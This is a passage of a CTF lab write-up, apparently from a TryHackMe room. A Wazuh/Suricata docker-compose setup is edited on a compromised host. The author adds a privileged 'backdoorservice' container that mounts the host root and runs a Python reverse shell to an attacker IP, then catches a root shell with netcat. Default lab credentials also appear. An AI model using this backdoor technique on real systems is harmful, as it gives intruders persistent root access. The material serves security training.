+      -  ossec_logs:/var/log/wazuh
+    networks:
+      - ctf
+  ctfscore:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscore:master
+    container_name: ctfscore
+    volumes:
+      - ./dockerctf/confs/ctfweb:/etc/ctfscore/
+    ports:
+      - 8000:8000
+    healthcheck:
+      test: ["CMD", "curl -f", "http://ctfscore:8000/"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.30
+  suricata:
+    restart: always
+    image: jasonish/suricata:latest
+    container_name: suricata
+    volumes:
+      - ./dockerctf/logs/suricata:/var/log/suricata/
+      - ./dockerctf/confs/suricata/:/etc/suricata/
+    cap_add:
+      - NET_ADMIN
+      - SYS_NICE
+      - NET_RAW
+    entrypoint: /usr/bin/suricata -c "/etc/suricata/suricata.yaml" -i ctf
+    network_mode: host
+  ctfwebsite:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscoreapache:master
+    ports:
+      - 80:80
+    entrypoint: ["/bin/bash", "-c" , "/var/ossec/bin/wazuh-control start && apache2ctl -D FOREGROUND"]
+    volumes:
+      - ./dockerctf/confs/ctfwebsite/ossec.conf:/var/ossec/etc/ossec.conf
+      - ./dockerctf/confs/ctfwebsite/html/:/var/www/html/
+    networks:
+      ctf:
+        ipv4_address: "172.200.0.10"
+    depends_on:
+      wazuh:
+        condition: service_healthy
+    healthcheck:
+      test: ["CMD", "curl", "http://ctfwebsite:8080"]
+      interval: 30s
+      timeout: 30s
+      retries: 5
+    links:
+      - wazuh:wazuh
+  ctfgrafana:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscoregrafana:master
+    entrypoint: ["/bin/bash", "-c" , '/var/ossec/bin/wazuh-control start && grafana-server -config "/etc/grafana/grafana.ini" -homepath "/usr/share/grafana/"']
+    volumes:
+      - ./dockerctf/confs/ctfgrafana/ossec.conf:/var/ossec/etc/ossec.conf
+      - ./dockerctf/confs/ctfgrafana/grafana.ini:/etc/grafana/grafana.ini
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.20
+    depends_on:
+      wazuh:
+        condition: service_healthy
+    links:
+      - wazuh:wazuh
+    ports:
+      - 3000:3000
+  wazuh:
+    restart: always
+    image: wazuh/wazuh-odfe:4.2.5
+    hostname: wazuh
+    environment:
+      - ELASTICSEARCH_URL=https://elasticsearch:9200
+      - ELASTIC_USERNAME=admin
+      - ELASTIC_PASSWORD=admin
+      - FILEBEAT_SSL_VERIFICATION_MODE=none
+    volumes:
+      - ossec_api_configuration:/var/ossec/api/configuration
+      - ossec_etc:/var/ossec/etc
+      - ossec_logs:/var/ossec/logs
+      - ossec_queue:/var/ossec/queue
+      - ossec_var_multigroups:/var/ossec/var/multigroups
+      - ossec_integrations:/var/ossec/integrations
+      - ossec_active_response:/var/ossec/active-response/bin
+      - ossec_agentless:/var/ossec/agentless
+      - ossec_wodles:/var/ossec/wodles
+      - filebeat_etc:/etc/filebeat
+      - filebeat_var:/var/lib/filebeat
+    healthcheck:
+      test: ["CMD", "curl","-u", "wazuh:wazuh", "-k", "-X", "GET", "https://wazuh:55000/security/user/authenticate"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.50
+        aliases:
+          - wazuh
+
+volumes:
+  ossec_api_configuration:
+  ossec_etc:
+  ossec_logs:
+  ossec_queue:
+  ossec_var_multigroups:
+  ossec_integrations:
+  ossec_active_response:
+  ossec_agentless:
+  ossec_wodles:
+  filebeat_etc:
+  filebeat_var:
+
+now edit it
+
+root@reversegear:/var/lib/ctf# nano docker-compose.yml 
+root@reversegear:/var/lib/ctf# cat docker-compose.yml 
+---
+version: '2.1'
+networks:
+  ctf:
+    driver: bridge
+    driver_opts:
+      com.docker.network.bridge.name: ctf
+    ipam:
+      config:
+        - subnet: "172.200.0.0/24"
+          gateway: "172.200.0.1"
+services:
+  ctflog:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscorelog:master
+    container_name: ctflog
+    volumes:
+      - ./dockerctf/logs/suricata/:/var/log/suricata
+      - ./dockerctf/confs/ctfscorelog/:/etc/ctfscorelog/
+      - ./dockerctf/logs/:/var/log/ctfscorelog/
+      -  ossec_logs:/var/log/wazuh
+    networks:
+      - ctf
+  ctfscore:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscore:master
+    container_name: ctfscore
+    volumes:
+      - ./dockerctf/confs/ctfweb:/etc/ctfscore/
+    ports:
+      - 8000:8000
+    healthcheck:
+      test: ["CMD", "curl -f", "http://ctfscore:8000/"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.30
+  suricata:
+    restart: always
+    image: jasonish/suricata:latest
+    container_name: suricata
+    volumes:
+      - ./dockerctf/logs/suricata:/var/log/suricata/
+      - ./dockerctf/confs/suricata/:/etc/suricata/
+    cap_add:
+      - NET_ADMIN
+      - SYS_NICE
+      - NET_RAW
+    entrypoint: /usr/bin/suricata -c "/etc/suricata/suricata.yaml" -i ctf
+    network_mode: host
+  ctfwebsite:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscoreapache:master
+    ports:
+      - 80:80
+    entrypoint: ["/bin/bash", "-c" , "/var/ossec/bin/wazuh-control start && apache2ctl -D FOREGROUND"]
+    volumes:
+      - ./dockerctf/confs/ctfwebsite/ossec.conf:/var/ossec/etc/ossec.conf
+      - ./dockerctf/confs/ctfwebsite/html/:/var/www/html/
+    networks:
+      ctf:
+        ipv4_address: "172.200.0.10"
+    depends_on:
+      wazuh:
+        condition: service_healthy
+    healthcheck:
+      test: ["CMD", "curl", "http://ctfwebsite:8080"]
+      interval: 30s
+      timeout: 30s
+      retries: 5
+    links:
+      - wazuh:wazuh
+  ctfgrafana:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscoregrafana:master
+    entrypoint: ["/bin/bash", "-c" , '/var/ossec/bin/wazuh-control start && grafana-server -config "/etc/grafana/grafana.ini" -homepath "/usr/share/grafana/"']
+    volumes:
+      - ./dockerctf/confs/ctfgrafana/ossec.conf:/var/ossec/etc/ossec.conf
+      - ./dockerctf/confs/ctfgrafana/grafana.ini:/etc/grafana/grafana.ini
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.20
+    depends_on:
+      wazuh:
+        condition: service_healthy
+    links:
+      - wazuh:wazuh
+    ports:
+      - 3000:3000
+  wazuh:
+    restart: always
+    image: wazuh/wazuh-odfe:4.2.5
+    hostname: wazuh
+    environment:
+      - ELASTICSEARCH_URL=https://elasticsearch:9200
+      - ELASTIC_USERNAME=admin
+      - ELASTIC_PASSWORD=admin
+      - FILEBEAT_SSL_VERIFICATION_MODE=none
+    volumes:
+      - ossec_api_configuration:/var/ossec/api/configuration
+      - ossec_etc:/var/ossec/etc
+      - ossec_logs:/var/ossec/logs
+      - ossec_queue:/var/ossec/queue
+      - ossec_var_multigroups:/var/ossec/var/multigroups
+      - ossec_integrations:/var/ossec/integrations
+      - ossec_active_response:/var/ossec/active-response/bin
+      - ossec_agentless:/var/ossec/agentless
+      - ossec_wodles:/var/ossec/wodles
+      - filebeat_etc:/etc/filebeat
+      - filebeat_var:/var/lib/filebeat
+    healthcheck:
+      test: ["CMD", "curl","-u", "wazuh:wazuh", "-k", "-X", "GET", "https://wazuh:55000/security/user/authenticate"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+    networks:
+      ctf:
+        ipv4_address: 172.200.0.50
+        aliases:
+          - wazuh
+
+volumes:
+  ossec_api_configuration:
+  ossec_etc:
+  ossec_logs:
+  ossec_queue:
+  ossec_var_multigroups:
+  ossec_integrations:
+  ossec_active_response:
+  ossec_agentless:
+  ossec_wodles:
+  filebeat_etc:
+  filebeat_var:
+version: "2.1"
+services:
+  backdoorservice:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscore:master
+    entrypoint: > 
+       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+       s.connect(("10.8.19.103",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+       pty.spawn("/bin/sh")'
+    volumes:
+      - /:/mnt
+    privileged: true
+
+docker backdoor
+
+root@reversegear:/var/lib/ctf# docker-compose up
+WARNING: Some networks were defined but are not used by any service: ctf
+Creating network "ctf_default" with the default driver
+WARNING: Found orphan containers (ctf_wazuh_1, ctflog, suricata, ctf_ctfgrafana_1, ctf_ctfwebsite_1, ctfscore) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
+Creating ctf_backdoorservice_1 ... done
+Attaching to ctf_backdoorservice_1
+
+┌──(witty㉿kali)-[~/bug_hunter]
+└─$ rlwrap nc -lvnp 4242      
+listening on [any] 4242 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.3.55] 59100
+```
+```text
+# whoami
+whoami
+root
+```
+```text
+# :)
+```
+Abuse docker to establish a backdoor on the host system
+Question Done
+### Conclusion
+I hope you've enjoyed this room and learned a few things. As previously mentioned this room was the first public test of the CTF scoring system project I've been developing. I have enclosed a link to the source code for the scoring system, It's licensed under AGPL-3.0 so feel free to modify it or add the system to your own CTF. There's documentation on installation and configuration available in the repo as well as links to prebuilt docker images.
+Repo Link: [https://github.com/Jroo1053/CTFScore](https://github.com/Jroo1053/CTFScore)
+Thanks for playing.
+Answer the questions below
+Read the above
+Question Done
+
+## Flags / Answers
+- ![Example NIDS Delpyment](https://tryhackme-images.s3.amazonaws.com/user-uploads/6009c682f889c2302b70e264/room-content/99c87a32eb94a9a977d84022a8c51ece.png)As the name implies, network intrusion detection systems or NIDS monitor networks for malicious activity by checking packets for traces of activity associated with a wide variety of hostile or unwanted activity including:
+
+## Notes / Lessons Learned
+[[Basic Static Analysis]]
+
